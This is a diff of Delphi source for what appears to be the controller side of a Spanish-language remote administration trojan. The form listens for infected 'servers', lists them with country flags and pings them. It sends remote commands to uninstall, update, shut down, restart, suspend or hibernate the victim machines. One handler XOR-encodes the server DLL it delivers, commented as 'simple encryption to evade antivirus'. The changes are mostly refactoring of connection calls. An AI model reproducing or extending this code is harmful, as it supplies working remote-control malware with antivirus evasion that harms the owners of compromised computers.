@@ -23,7 +23,7 @@ uses
   Menus, IniFiles, IdThreadMgrDefault,
   IdAntiFreeze, IdTCPServer,
   UnitVariables, gnugettext, CommCtrl, MMSystem, IdThreadMgr,
-  IdAntiFreezeBase, IdBaseComponent, IdComponent, ImgList, jpeg, UnitPlugins;
+  IdAntiFreezeBase, IdBaseComponent, IdComponent, ImgList, jpeg, UnitPlugins, UnitFunciones;
 
 const
   WM_POP_MESSAGE = WM_USER + 1; //Mensaje usado para las notificaciones
@@ -215,10 +215,16 @@ const
 
 implementation
 
-uses UnitOpciones, UnitAbout, UnitID, UnitFormConfigServer,
+uses
+  UnitOpciones,
+  UnitAbout,
+  UnitID,
+  UnitFormConfigServer,
   UnitFormLanguage,
-  UnitFormControl, UnitFormNotifica,
-  UnitEstadisticasConexiones, ScreenMaxCap;
+  UnitFormControl,
+  UnitFormNotifica,
+  UnitEstadisticasConexiones,
+  ScreenMaxCap;
 
 {$R *.dfm}
 
@@ -250,7 +256,6 @@ end;
 //Fin de eventos del Formulario
 
 //Eventos de los botones del Formulario
-
 procedure TFormMain.BtnConfigServerClick(Sender: TObject);
 begin
   FormConfigServer.Show;
@@ -376,7 +381,6 @@ end;
 //Fin de los eventos de los botones del Formulario
 
 //Evento que se ejecuta al recibir el mensaje WM_EVENT_MESSAGE, para los eventos: Nueva conexion, intento de conexion, desconexion...
-
 procedure TFormMain.OnEventReceive(var Msg: TMessage);
 var
   Tipo: Integer;
@@ -388,7 +392,6 @@ begin
 end;
 
 //Evento que se ejecuta al recibir el mensaje WM_POP_MESSAGE, para las notificaciones
-
 procedure TFormMain.OnPopMessage(var Msg: TMessage);
 var
   item: TListItem;
@@ -406,11 +409,10 @@ begin
 end;
 
 //Eventos del ServerSocket
-
 procedure TFormMain.ServerSocketConnect(AThread: TIdPeerThread);
 begin
   AThread.Connection.MaxLineLength := 1024 * 1024; //Long Max linea
-  AThread.Connection.WriteLn('MAININFO|' + IntToStr(Athread.Handle));
+  ConnectionWriteLn(AThread, 'MAININFO|' + IntToStr(Athread.Handle));
 end;
 
 procedure TFormMain.ServerSocketDisconnect(AThread: TIdPeerThread);
@@ -458,16 +460,6 @@ begin
   StatusBar.Panels[0].Text := _('Número de conexiones: ') + IntToStr(NumeroConexiones);
 end;
 
-//DSR DEV
-function StrToHex(Str: string): string;
-var
-  I: Integer;
-begin
-  Result := EmptyStr;
-  for I := 1 to Length(Str) do
-    Result := Result + IntToHex(Byte(Str[I]), SizeOf(Byte) * 2);
-end;
-
 procedure TFormMain.ServerSocketExecute(AThread: TIdPeerThread);
 var
   Len, i, Ping: Integer;
@@ -480,20 +472,18 @@ var
 
 begin
   try
-    Buffer := (Athread.Connection.ReadLn(#10#15#80#66#77#1#72#87));
+    Buffer := (ConnectionReadLn(Athread, #10#15#80#66#77#1#72#87));
   except
     Athread.Connection.Disconnect;
     Exit;
   end;
   Len := Length(Buffer);
 
-  if Buffer = '' then exit;
-
   if Buffer = 'CONNECTED?' then
     Exit //Lo ignoramos
   else if Buffer = 'PING' then
     begin
-      Athread.Connection.WriteLn('PONG');
+      ConnectionWriteLn(AThread, 'PONG');
     end
   else if Copy(Buffer, 1, 9) = 'GETSERVER' then //Conectador.dll nos está pidiendo el servidor
     begin //GETSERVER|clavecifrado1|clavecifrado2|
@@ -509,7 +499,7 @@ begin
       for i := 1 to Length(ServDLL) do
         TmpServDLL[i] := chr(Ord(TmpServDLL[i]) xor StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1))); //Cifrado simple para evadir antivirus
 
-      Athread.Connection.Write(#14 + IntToStr(Length(TmpServDLL)) + #14 + TmpServDLL);
+      ConnectionWrite(AThread, #14 + IntToStr(Length(TmpServDLL)) + #14 + TmpServDLL);
     end
   else if Copy(Buffer, 1, 4) = 'PONG' then
     begin
@@ -562,10 +552,6 @@ begin
       Exit;
     end;
 
-
-
-   SHOWMESSAGE(StrToHex(PChar(Buffer)));
-
   {Si llega aquí es que el SocketHandle no se encontró entre los SocketHandles
    de las conexiones principales y una de dos:
    -Es un nuevo server
@@ -615,7 +601,7 @@ begin
         if banderas[i] = lowercase(Recibido) then
           item.ImageIndex := i + 7;
 
-      //AThread.Connection.WriteLn('GETSH|'+IntToStr(AThread.Handle));
+      //ConnectionWriteLn(AThread, 'GETSH|'+IntToStr(AThread.Handle));
       //Mostramos la notificación
       Recibido := '';
       if Formopciones.CheckBoxNotificacionMsn.Checked and not DesactivarNotificaciones then
@@ -686,7 +672,6 @@ begin
 end;
 
 //Al dar al boton abrir
-
 procedure TFormMain.Abrir1Click(Sender: TObject);
 var
   VentanaControl: TFormControl;
@@ -714,7 +699,7 @@ begin
       if (mslistviewitem.SubItems[4] <> '.') then
         begin
           AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
-          AThread.Connection.WriteLn('PING');
+          ConnectionWriteLn(AThread, 'PING');
           //Como objeto 2 guardamos una captura del tiempo en milisegundos
           mslistviewitem.SubItems.Objects[2] := TObject(GetTickCount());
         end;
@@ -728,7 +713,6 @@ begin
 end;
 
 //Al pulsar en la columna del ListViewConexiones ordenar filas según el valor de esa columna
-
 procedure TFormMain.ListViewConexionesColumnClick(Sender: TObject; Column: TListColumn);
 begin
   Columna := Column.Index;
@@ -741,7 +725,6 @@ begin
 end;
 
 //Para ordenar el ListViewConexiones
-
 procedure TFormMain.ListViewConexionesCompare(Sender: TObject;
   Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
 var
@@ -767,7 +750,6 @@ begin
 end;
 
 //Funciones para leer y guardar la configuración en el archivo .INI
-
 procedure TFormMain.LeerArchivoINI();
 var
   Ini: TIniFile;
@@ -906,8 +888,6 @@ begin
     Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');
 
     //Valores de la Form de Opciones
-
-
     Ini.WriteString('Opciones', 'Plugins', FormOpciones.Plugins);
     Ini.WriteString('Opciones', 'PuertoEscucha', FormOpciones.EditPuerto.Text);
     Ini.WriteBool('Opciones', 'PreguntarSalir',
@@ -1026,7 +1006,6 @@ begin
 end;
 
 //Para el globo emergente
-
 procedure TFormMain.GloboEmergente(titulo: string; mensaje: string; tipo: Cardinal);
 begin
   TrayIconData.cbSize := SizeOf(TrayIconData);
@@ -1178,7 +1157,7 @@ begin //Mandar Ping cada 30 segundos
         if ((ListViewConexiones.Items[i].SubItems[4] <> '.') and (ListViewConexiones.Items[i].SubItems.Objects[0] <> nil)) then //solo si no estamos mandando ping
           begin
             AThread := TidPeerThread(ListViewConexiones.Items[i].SubItems.Objects[0]);
-            AThread.Connection.WriteLn('PING');
+            ConnectionWriteLn(AThread, 'PING');
             //Como objeto 2 guardamos una captura del tiempo en milisegundos
             ListViewConexiones.Items[i].SubItems.Objects[2] := TObject(GetTickCount());
           end;
@@ -1328,7 +1307,7 @@ begin
   while Assigned(mslistviewitem) do
     begin
       AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
-      AThread.Connection.WriteLn('SERVIDOR|CERRAR|');
+      ConnectionWriteLn(AThread, 'SERVIDOR|CERRAR|');
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
@@ -1357,7 +1336,7 @@ begin
   while Assigned(mslistviewitem) do
     begin
       AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
-      AThread.Connection.WriteLn('SERVIDOR|DESINSTALAR|');
+      ConnectionWriteLn(AThread, 'SERVIDOR|DESINSTALAR|');
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
@@ -1377,7 +1356,7 @@ begin
   while Assigned(mslistviewitem) do
     begin
       AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
-      AThread.Connection.WriteLn('SERVIDOR|ACTUALIZAR|');
+      ConnectionWriteLn(AThread, 'SERVIDOR|ACTUALIZAR|');
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
@@ -1534,7 +1513,7 @@ begin
   while Assigned(mslistviewitem) do
     begin
       AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
-      AThread.Connection.WriteLn('APAGARPC');
+      ConnectionWriteLn(AThread, 'APAGARPC');
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
@@ -1554,7 +1533,7 @@ begin
   while Assigned(mslistviewitem) do
     begin
       AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
-      AThread.Connection.WriteLn('CERRARSESIONPC');
+      ConnectionWriteLn(AThread, 'CERRARSESIONPC');
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
@@ -1574,7 +1553,7 @@ begin
   while Assigned(mslistviewitem) do
     begin
       AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
-      AThread.Connection.WriteLn('REINICIARPC');
+      ConnectionWriteLn(AThread, 'REINICIARPC');
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
@@ -1594,7 +1573,7 @@ begin
   while Assigned(mslistviewitem) do
     begin
       AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
-      AThread.Connection.WriteLn('SUSPENDERPC');
+      ConnectionWriteLn(AThread, 'SUSPENDERPC');
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
@@ -1614,7 +1593,7 @@ begin
   while Assigned(mslistviewitem) do
     begin
       AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
-      AThread.Connection.WriteLn('HIBERNARPC');
+      ConnectionWriteLn(AThread, 'HIBERNARPC');
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
 end;
